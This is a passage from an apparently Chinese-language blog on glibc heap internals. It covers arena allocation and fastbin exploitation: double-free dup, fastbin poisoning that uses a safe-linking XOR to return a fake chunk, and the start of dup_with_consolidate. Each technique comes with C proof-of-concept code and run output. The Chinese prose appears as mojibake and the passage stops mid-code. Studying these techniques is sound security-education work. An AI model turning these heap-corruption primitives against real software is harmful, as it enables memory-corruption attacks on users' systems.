<p>æ­¤æ—¶ä¼šè°ƒç”¨<code>arena_get2</code>,è¿™ä¸ªå‡½æ•°ä¼šå°è¯•æ‰¾ä¸€ä¸ªå½“å‰ç©ºé—²çš„åˆ†é…åŒº,å¦‚æœæœ‰åˆ™è¿”å›</p>
<p>å¦‚æœæ²¡æœ‰ä¼šå°è¯•æ–°åˆ›å»ºä¸€ä¸ªåˆ†é…åŒº,å¦‚æœå·²ç»è¾¾åˆ°äº†åˆ†é…åŒºæ•°é‡ä¸Šé™,åªèƒ½ç­‰ç€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> mstate</span><br><span class="line"><span class="title function_">arena_get2</span> <span class="params">(<span class="type">size_t</span> size, mstate avoid_arena)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate a;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> <span class="type">size_t</span> narenas_limit;</span><br><span class="line"></span><br><span class="line">  a = get_free_list ();	<span class="comment">//å°è¯•ä»freelistä¸Šæ‹¿ä¸€ä¸ªåˆ†é…åŒº</span></span><br><span class="line">  <span class="keyword">if</span> (a == <span class="literal">NULL</span>)  <span class="comment">//å¦‚æœa == NULLè¯´æ˜å½“å‰æ²¡æœ‰ç©ºé—²çš„åˆ†é…åŒº</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Nothing immediately available, so generate a new arena.  */</span></span><br><span class="line">      <span class="keyword">if</span> (narenas_limit == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (mp_.arena_max != <span class="number">0</span>) <span class="comment">//å¦‚æœåˆ†é…åŒºæ•°é‡æœ‰æ˜ç¡®é…ç½®çš„ä¸Šé™</span></span><br><span class="line">            narenas_limit = mp_.arena_max;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> (narenas &gt; mp_.arena_test)<span class="comment">//å¦åˆ™</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="type">int</span> n = __get_nprocs_sched ();<span class="comment">//è·å–èƒ½å¤Ÿä½¿ç”¨çš„CPUæ ¸å¿ƒæ•°</span></span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (n &gt;= <span class="number">1</span>)</span><br><span class="line">                narenas_limit = NARENAS_FROM_NCORES (n);<span class="comment">//åœ¨x86_64ä¸Šæœ€å¤šæ˜¯8*n</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                <span class="comment">/* We have no information about the system.  Assume two</span></span><br><span class="line"><span class="comment">                   cores.  */</span></span><br><span class="line">                narenas_limit = NARENAS_FROM_NCORES (<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    repeat:;</span><br><span class="line">      <span class="type">size_t</span> n = narenas;</span><br><span class="line">      <span class="comment">/* NB: the following depends on the fact that (size_t)0 - 1 is a</span></span><br><span class="line"><span class="comment">         very large number and that the underflow is OK.  If arena_max</span></span><br><span class="line"><span class="comment">         is set the value of arena_test is irrelevant.  If arena_test</span></span><br><span class="line"><span class="comment">         is set but narenas is not yet larger or equal to arena_test</span></span><br><span class="line"><span class="comment">         narenas_limit is 0.  There is no possibility for narenas to</span></span><br><span class="line"><span class="comment">         be too big for the test to always fail since there is not</span></span><br><span class="line"><span class="comment">         enough address space to create that many arenas.  */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (n &lt;= narenas_limit - <span class="number">1</span>))  <span class="comment">//è¿˜èƒ½åˆ›å»ºæ–°çš„åˆ†é…åŒº</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (catomic_compare_and_exchange_bool_acq (&amp;narenas, n + <span class="number">1</span>, n))</span><br><span class="line">            <span class="keyword">goto</span> repeat;</span><br><span class="line">          a = _int_new_arena (size);    <span class="comment">//åˆ›å»ºæ–°åˆ†é…åŒº</span></span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (a == <span class="literal">NULL</span>))</span><br><span class="line">            catomic_decrement (&amp;narenas);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span>    <span class="comment">//æ— æ³•åˆ›å»ºæ–°åˆ†é…åŒº,æ­¤æ—¶åªèƒ½è½®è¯¢å·²æœ‰çš„åˆ†é…åŒºç­‰å¾…</span></span><br><span class="line">        a = reused_arena (avoid_arena); </span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œ<code>freelist</code>ç”¨äºåœ¨å¤šçº¿ç¨‹åœºæ™¯ä¸‹,ä¿å­˜å½“å‰ç©ºé—²çš„åˆ†é…åŒº</p>
<p>åˆ†é…åŒº<code>malloc_state</code>ä¸­æœ‰ä¸€ä¸ª<code>next_free</code>å°±æ˜¯å•é“¾è¡¨åç»§æŒ‡é’ˆ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* offset      |    size */</span>  type = <span class="keyword">struct</span> malloc_state &#123;</span><br><span class="line"><span class="comment">/* 0x0000      |  0x0004 */</span>    <span class="type">__libc_lock_t</span> mutex;</span><br><span class="line"><span class="comment">/* 0x0004      |  0x0004 */</span>    <span class="type">int</span> flags;</span><br><span class="line"><span class="comment">/* 0x0008      |  0x0004 */</span>    <span class="type">int</span> have_fastchunks;</span><br><span class="line"><span class="comment">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="comment">/* 0x0010      |  0x0050 */</span>    mfastbinptr fastbinsY[<span class="number">10</span>];</span><br><span class="line"><span class="comment">/* 0x0060      |  0x0008 */</span>    mchunkptr top;</span><br><span class="line"><span class="comment">/* 0x0068      |  0x0008 */</span>    mchunkptr last_remainder;</span><br><span class="line"><span class="comment">/* 0x0070      |  0x07f0 */</span>    mchunkptr bins[<span class="number">254</span>];</span><br><span class="line"><span class="comment">/* 0x0860      |  0x0010 */</span>    <span class="type">unsigned</span> <span class="type">int</span> binmap[<span class="number">4</span>];</span><br><span class="line"><span class="comment">/* 0x0870      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/* 0x0878      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"><span class="comment">/* 0x0880      |  0x0008 */</span>    <span class="type">size_t</span> attached_threads;</span><br><span class="line"><span class="comment">/* 0x0888      |  0x0008 */</span>    <span class="type">size_t</span> system_mem;</span><br><span class="line"><span class="comment">/* 0x0890      |  0x0008 */</span>    <span class="type">size_t</span> max_system_mem;</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes): 2200 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœfreelistä¸ºç©º,è¯´æ˜å½“å‰æ²¡æœ‰ç©ºé—²çš„åˆ†é…åŒº,ä½†æ˜¯å“¥ä»¬æ€¥ç€è¦ç”¨å †å—,æ€ä¹ˆåŠå‘¢? å°è¯•åˆ›å»ºä¸€ä¸ªæ–°çš„åˆ†é…åŒº</p>
<p>ä½†ä¹Ÿä¸æ˜¯ä¸€æ€¥å°±å¾—ç«‹åˆ»åˆ›å»ºæ–°åˆ†é…åŒº, è¿™ä¸ªåˆ†é…åŒºæœ‰ä¸€ä¸ªæ•°é‡ä¸Šé™,<code>8*æ ¸å¿ƒæ•°</code></p>
<p>å¦‚æœèƒ½å¤Ÿåˆ›å»º,é‚£ä¹ˆå°±è°ƒç”¨<code>_int_new_arena</code>åˆ›å»ºæ–°åˆ†é…åŒº</p>
<p>è¿™ä¸ªå‡½æ•°ä¼šè°ƒç”¨<code>new_heap</code>,ç»§è€Œè°ƒç”¨<code>alloc_new_heap</code>å‡½æ•°åˆ›å»ºä¸€ä¸ª<code>heap_info</code>ç»“æ„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h = new_heap (size + (<span class="keyword">sizeof</span> (*h) + <span class="keyword">sizeof</span> (*a) + MALLOC_ALIGNMENT), mp_.top_pad);</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">heap_info *h = alloc_new_heap (size, top_pad, mp_.hp_pagesize, mp_.hp_flags);</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p2 = (<span class="type">char</span> *) MMAP (aligned_heap_area, max_size, PROT_NONE, mmap_flags);</span><br></pre></td></tr></table></figure>

<p>å®é™…ä¸Šä¼šè°ƒç”¨mmapç³»ç»Ÿè°ƒç”¨å‘æ“ä½œç³»ç»Ÿè¦ä¸€å¤§å—ç©ºé—´</p>
<h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><h3 id="fastbins"><a href="#fastbins" class="headerlink" title="fastbins"></a>fastbins</h3><h4 id="double-free-dup"><a href="#double-free-dup" class="headerlink" title="double free dup"></a>double free dup</h4><p><code>fastbins</code>ä¸­å¯¹äºäºŒæ¬¡é‡Šæ”¾çš„åˆ¤æ–­å¾ˆå”æ°</p>
<p><code>fastbins</code>åªä¼šåˆ¤æ–­å½“å‰æ­£åœ¨é‡Šæ”¾çš„å †å—å’ŒæŒ‚åœ¨æ¡¶å­å¤´ä¸Šçš„ç¬¬ä¸€å—æ˜¯ä¸æ˜¯ç›¸åŒ, å¦‚æœæ˜¯å°±è®¤ä¸ºæ˜¯<code>Double Free</code>äº†</p>
<p>å¦‚æœ<code>fastbin</code>ä¸Šè¿™æ ·:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin[idx] =&gt; A =&gt; B =&gt; NULL</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶é‡Šæ”¾<code>B</code>å°±å¯ä»¥ç»•è¿‡æ£€æŸ¥é€ æˆ<code>Double Free</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin[idx] =&gt; B =&gt; A =&gt; B =&gt; NULL</span><br></pre></td></tr></table></figure>



<p>è¿™åˆæœ‰ä¸ªé—®é¢˜,ä½¿ç”¨<code>malloc</code>ç”³è¯·å†…å­˜æ—¶</p>
<p>å¦‚æœ<code>tcachebins</code>ä¸­æœ‰ä¸œè¥¿,é‚£ä¹ˆ<code>malloc</code>ä¼šä»<code>tcache</code>ä¸­æ‹¿,ä¸ä¼šæ‹¿<code>fastbins</code>çš„</p>
<p>ä½†æ˜¯å¦‚æœ<code>tcachebins</code>ä¸­æ²¡ä¸œè¥¿,é‚£ä¹ˆå½“ä»<code>fastbins</code>ä¸­æ‹¿ä¸€ä¸ªä¹‹å,å‰©ä¸‹çš„éƒ½ä¼šè¢«æ”¾åˆ°<code>tcachebins</code>ä¸­</p>
<p>ä¸ºäº†é¿å…<code>tcache</code>æŠ¢ä¸œè¥¿,å¯ä»¥ä½¿ç”¨<code>calloc</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">malloc =&gt; __libc_malloc	//æ­¤å¤„é¦–å…ˆå°è¯•ä»tcacheè·å–å †å—</span><br><span class="line">	_int_malloc			//æ­¤å¤„å°è¯•ä»æ–Œå®¶è·å–</span><br><span class="line">	</span><br><span class="line">calloc =&gt; __libc_malloc	//ä¸ä½¿ç”¨tcache,ç›´æ¥è°ƒç”¨_int_malloc</span><br><span class="line">	_int_malloc			//æ­¤å¤„å°è¯•ä»æ–Œå®¶è·å–,ä½†æ˜¯å¦‚æœtcacheä¸æ»¡,è¿˜æ˜¯ä¼šæŠ¢æ–Œå®¶çš„å¡«æ»¡tcache</span><br></pre></td></tr></table></figure>

<p>ä¸ºäº†é¿å…<code>tcache</code>é€ æˆå½±å“,å¯ä»¥é¦–å…ˆå°†<code>tcache</code>å¡«æ»¡,ç›®çš„æ˜¯åœ¨æ–Œå®¶åˆ†é…ä¸€æ¬¡å,é¿å…å‰©ä½™çš„å †å—è¿›å…¥<code>tcache</code></p>
<p>ç„¶åä½¿ç”¨<code>calloc</code>å‡½æ•°åˆ†é…,ç›®çš„æ˜¯é¿å…ä»<code>tcache</code>ä¸­å–å †å—</p>
<p>å†™ä¸ª<code>exp</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;printf this time will establish a write buffer\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *A;</span><br><span class="line">    <span class="type">size_t</span> *B;</span><br><span class="line">    <span class="type">size_t</span> *C;</span><br><span class="line">    <span class="comment">// size_t *barrier;        </span></span><br><span class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    B = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;       </span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;       <span class="comment">//fill tcache</span></span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(B);                    <span class="comment">//next free to fastbin</span></span><br><span class="line">    <span class="built_in">free</span>(A);</span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    <span class="comment">//fastbins[idx] =&gt; B =&gt; A =&gt; B</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    B = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);           <span class="comment">//next malloc from fastbin</span></span><br><span class="line">    A = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line">    C = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;B: %p\n&quot;</span>, B);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A: %p\n&quot;</span>, A);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;C: %p\n&quot;</span>, C);</span><br><span class="line">    assert(B == C);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins# make</span><br><span class="line">gcc -w -g -o fastbin_dup fastbin_dup.c -o fastbin_dup</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins# ./fastbin_dup</span><br><span class="line"><span class="built_in">printf</span> this time will establish a write buffer</span><br><span class="line">B: 0x55dd112b2700</span><br><span class="line">A: 0x55dd112b26b0</span><br><span class="line">C: 0x55dd112b2700</span><br></pre></td></tr></table></figure>

<h4 id="poison"><a href="#poison" class="headerlink" title="poison"></a>poison</h4><p>åˆ©ç”¨<code>Double Free</code>,æˆ–è€…å…¶ä»–æ‰‹æ®µ, ä½¿å¾—å †ç®¡ç†å™¨æŒæœ‰æŸä¸ªå †å—æŒ‡é’ˆçš„åŒæ—¶, æˆ‘ä»¬ä¹ŸæŒæœ‰ä¸€ä¸ª</p>
<p>æ­¤æ—¶æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªæŒ‡é’ˆè¿›è¡Œ<code>Use After Free</code>, å¯¹è¯¥å·²ç»é‡Šæ”¾çš„å †å—è¿›è¡Œå†™å…¥æ“ä½œ, è¦†ç›–è¯¥å †å—çš„å…ƒæ•°æ®, ä¿®æ”¹<code>fd</code>æŒ‡é’ˆæŒ‡å‘ä»»æ„åœ°å€</p>
<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> sz  0x40</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> prev_size;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span>* fd;</span><br><span class="line">    <span class="type">size_t</span>* bk;</span><br><span class="line">&#125;malloc_chunk;</span><br><span class="line"></span><br><span class="line">malloc_chunk fake_chunk=&#123;</span><br><span class="line">    .prev_size = <span class="number">0</span>,</span><br><span class="line">    .size = (sz + <span class="number">0x10</span>) | <span class="number">1</span>,</span><br><span class="line">    .fd = <span class="number">0</span>,</span><br><span class="line">    .bk = <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;printf this time will establish a write buffer\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> * tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> * A;</span><br><span class="line">    <span class="type">size_t</span> * B;</span><br><span class="line">    <span class="type">size_t</span> * C;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = (<span class="type">size_t</span>*)<span class="built_in">malloc</span>(sz);</span><br><span class="line">    &#125;</span><br><span class="line">    A = (<span class="type">size_t</span>*)<span class="built_in">malloc</span>(sz);</span><br><span class="line">    B = (<span class="type">size_t</span>*)<span class="built_in">malloc</span>(sz);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;           <span class="comment">//fill tcache</span></span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(A);                        <span class="comment">//free to fastbin</span></span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    <span class="built_in">free</span>(A);</span><br><span class="line">    <span class="comment">//fastbins[idx] =&gt; A =&gt; B =&gt; A</span></span><br><span class="line"></span><br><span class="line">    A = <span class="built_in">calloc</span>(<span class="number">1</span>,sz);</span><br><span class="line">    B = <span class="built_in">calloc</span>(<span class="number">1</span>,sz);</span><br><span class="line">    <span class="comment">//fastbins[idx] =&gt; A</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> * fake_chunk_mem = (<span class="type">char</span>*)&amp;fake_chunk + <span class="number">0x10</span>;</span><br><span class="line">    A[<span class="number">0</span>] = ((<span class="type">size_t</span>)A &gt;&gt; <span class="number">12</span>) ^ (<span class="type">size_t</span>)&amp;fake_chunk;</span><br><span class="line">    <span class="comment">//fastbins[idx] =&gt; A =&gt; fake_chunk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk_mem = %p\n&quot;</span>, fake_chunk_mem);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A = %p\n&quot;</span>, A);</span><br><span class="line">    A = <span class="built_in">calloc</span>(<span class="number">1</span>,sz);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A = %p\n&quot;</span>, A);</span><br><span class="line">    C = <span class="built_in">calloc</span>(<span class="number">1</span>,sz);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;C = %p\n&quot;</span>, C);</span><br><span class="line">    assert(C == fake_chunk_mem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# make</span><br><span class="line">gcc -w -g -o fastbin_poison fastbin_poison.c -o fastbin_poison</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./fastbin_poison</span><br><span class="line"><span class="built_in">printf</span> this time will establish a write buffer</span><br><span class="line">fake_chunk_mem = 0x55d7ebf53030</span><br><span class="line">A = 0x55d7ed23d8e0</span><br><span class="line">A = 0x55d7ed23d8e0</span><br><span class="line">C = 0x55d7ebf53030</span><br></pre></td></tr></table></figure>



<h4 id="dup-with-consolidate"><a href="#dup-with-consolidate" class="headerlink" title="dup_with_consolidate"></a>dup_with_consolidate</h4><p>0.å¡«å……<code>tcache</code></p>
<p>1.æ‰¾ä¸€ä¸ªä¸<code>topchunk</code>ç›¸é‚»çš„å°å †å—,<code>free</code>è¿›å…¥<code>fastbins</code>,&#x3D;&#x3D;å¹¶ç»§ç»­æŒæœ‰å…¶æŒ‡é’ˆ&#x3D;&#x3D;</p>
<p>2.å‘èµ·<code>0x400</code>å­—èŠ‚çš„åˆ†é…ç”³è¯·,å¯¼è‡´<code>malloc_consolidate</code>,ä½¿å¾—<code>fastbins</code>ä¸­çš„å †å—åˆå¹¶åˆ°<code>topchunk</code>,ç„¶åæœ¬æ¬¡ç”³è¯·æ‹¿åˆ°åŒä¸€ä¸ªæŒ‡é’ˆ,ä½†æ˜¯å †å—å¤§å°å˜æˆäº†<code>0x411</code>(åŒ…æ‹¬å…ƒæ•°æ®,æ ‡å¿—ä½å’Œç”¨æˆ·ç©ºé—´)</p>
<p>3.<code>free</code>å°å †å—çš„é‡æŒ‡é’ˆ,è¿™å®é™…ä¸Šä¼šå¯¼è‡´å¤§å—è¢«é‡Šæ”¾è¿›å…¥<code>unsortedbin</code></p>
<p>4.å†æ¬¡å‘èµ·<code>0x400</code>å­—èŠ‚çš„åˆ†é…ç”³è¯·,å†æ¬¡æ‹¿åˆ°åŒä¸€ä¸ªå †å—</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;this printf will establish the write buffer\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> * tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> * A;</span><br><span class="line">    <span class="type">size_t</span> * B;</span><br><span class="line">    <span class="type">size_t</span> * C;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;++i)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x40</span>);           <span class="comment">//malloc a chunk next to the topchunk</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;++i)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]); <span class="comment">//fill the tcache</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// A = calloc(1,0x40);</span></span><br><span class="line">    <span 